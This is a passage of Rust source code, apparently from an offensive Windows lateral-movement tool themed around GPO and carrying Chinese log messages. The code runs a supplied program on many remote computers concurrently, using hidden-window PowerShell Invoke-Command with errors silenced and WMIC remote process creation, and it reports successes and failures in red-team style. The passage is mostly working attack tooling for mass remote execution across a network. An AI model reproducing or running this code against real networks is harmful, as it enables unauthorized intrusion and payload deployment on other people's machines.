                let script_path = script_path_clone.clone();
                async move { Self::remote_execute_program_powershell_static(&computer, &script_path) }
            },
            10,
            "执行程序",
        ))?;
        
        println!("[+] 程序执行完成: 成功 {}, 失败 {}", success, failed);
        Ok(())
    }

    fn remote_execute_program_powershell_static(computer: &str, script_path: &str) -> Result<(), GPOError> {
        let ps_script = format!(
            "Invoke-Command -ComputerName {} -ScriptBlock {{ Start-Process -FilePath '{}' -WindowStyle Hidden }} -ErrorAction SilentlyContinue",
            computer, script_path
        );
        
        let output = Self::execute_powershell_with_timeout(&ps_script, 60, &format!("执行程序{}", computer))?;
        
        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            return Err(GPOError(format!("程序执行失败: {}", error_msg)));
        }
        
        Ok(())
    }

    #[cfg(windows)]
    fn remote_execute_programs_api(&self, computers: &[String], script_path: &str) -> Result<(), GPOError> {
        let script_path_clone = Arc::new(script_path.to_string());
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| GPOError(format!("创建 runtime 失败: {}", e)))?;
        let (success, failed) = rt.block_on(Self::execute_concurrent_async(
            computers,
            move |computer| {
                let script_path = (*script_path_clone).clone();
                Self::remote_execute_program_api_static_async(computer, script_path)
            },
            10,
            "执行程序",
        ))?;
        
        println!("[+] 程序执行完成: 成功 {}, 失败 {}", success, failed);
        Ok(())
    }

    #[cfg(windows)]
    async fn remote_execute_program_api_static_async(computer: String, script_path: String) -> Result<(), GPOError> {
        let computer_wmi = if computer.contains('.') || computer.contains('\\') {
            computer.clone()
        } else {
            format!("\\\\{}", computer)
        };
        
        let command_line = &script_path;
        
        let wmic_command = format!(
            "wmic /node:{} process call create \"{}\"",
            computer_wmi, command_line
        );
        
        Self::execute_command_with_timeout_async(
            &["cmd", "/C", &wmic_command],
            30,
            "WMI远程程序执行"
        ).await?;
        
        println!("[+] WMI 远程程序执行已触发: {}", computer);
        Ok(())
    }

    async fn execute_command_with_timeout_async(
        args: &[&str],
        timeout_secs: u64,
        operation_name: &str,
    ) -> Result<(), GPOError> {
        use tokio::process::Command;
        use tokio::time::{timeout, Duration};
        
        let mut cmd = Command::new(args[0]);
        if args.len() > 1 {
            cmd.args(&args[1..]);
        }
        
        let output = timeout(Duration::from_secs(timeout_secs), cmd.output())
            .await
            .map_err(|_| GPOError(format!("{} 超时 ({}秒)", operation_name, timeout_secs)))?
            .map_err(|e| GPOError(format!("执行命令失败: {}", e)))?;
        
        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            return Err(GPOError(format!("{} 失败: {}", operation_name, error_msg)));
        }
        
        Ok(())
    }

    fn generate_random_name(length: usize) -> String {
        const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        use std::time::{SystemTime, UNIX_EPOCH};
        
        let seed = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        
        (0..length)
            .map(|i| {
                let idx = ((seed + i as u128) % CHARSET.len() as u128) as usize;
                CHARSET[idx] as char
            })
            .collect()
    }

    async fn execute_powershell_with_timeout_async(
        script: &str,
        timeout_secs: u64,
        operation_name: &str,
    ) -> Result<std::process::Output, GPOError> {
        use tokio::process::Command;
        use tokio::time::{timeout, Duration};
        
        let output = timeout(
            Duration::from_secs(timeout_secs),
            Command::new("powershell")
                .args(&["-Command", script])
                .output()
        )
        .await
        .map_err(|_| GPOError(format!("{} 超时 ({}秒)", operation_name, timeout_secs)))?
        .map_err(|e| GPOError(format!("PowerShell 执行失败: {}", e)))?;
        
        Ok(output)
    }

    fn execute_powershell_with_timeout(
        script: &str,
        timeout_secs: u64,
        operation_name: &str,
    ) -> Result<std::process::Output, GPOError> {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| GPOError(format!("创建 runtime 失败: {}", e)))?;
        rt.block_on(Self::execute_powershell_with_timeout_async(script, timeout_secs, operation_name))
    }

    async fn execute_concurrent_async<F, Fut>(
        computers: &[String],
        operation: F,
        max_concurrent: usize,
        operation_name: &str,
    ) -> Result<(usize, usize), GPOError>
    where
        F: Fn(String) -> Fut + Send + Sync + 'static,
        Fut: std::future::Future<Output = Result<(), GPOError>> + Send + 'static,
    {
        use tokio::sync::Semaphore;
        
        let semaphore = Arc::new(Semaphore::new(max_concurrent));
        let success_count = Arc::new(AtomicUsize::new(0));
        let failed_count = Arc::new(AtomicUsize::new(0));
        let operation = Arc::new(operation);
        
        let mut tasks = Vec::new();
        
        for computer in computers {
            let permit = semaphore.clone().acquire_owned().await
                .map_err(|e| GPOError(format!("获取信号量失败: {:?}", e)))?;
            let computer = computer.clone();
            let op = operation.clone();
            let success = success_count.clone();
            let failed = failed_count.clone();
            let op_name = operation_name.to_string();
            
            tasks.push(tokio::spawn(async move {
                let _permit = permit;
                let computer_name = computer.clone();
                match op(computer).await {
                    Ok(()) => {
                        println!("[+] {} {} 成功", computer_name, op_name);
                        success.fetch_add(1, Ordering::SeqCst);
                    }
                    Err(e) => {
                        println!("[!] {} {} 失败: {}", computer_name, op_name, e);
                        failed.fetch_add(1, Ordering::SeqCst);
                    }
                }
            }));
        }
        
        for task in tasks {
            task.await.map_err(|e| GPOError(format!("任务执行失败: {:?}", e)))?;
        }
        
        let success = success_count.load(Ordering::SeqCst);
        let failed = failed_count.load(Ordering::SeqCst);
        
        Ok((success, failed))
    }
}
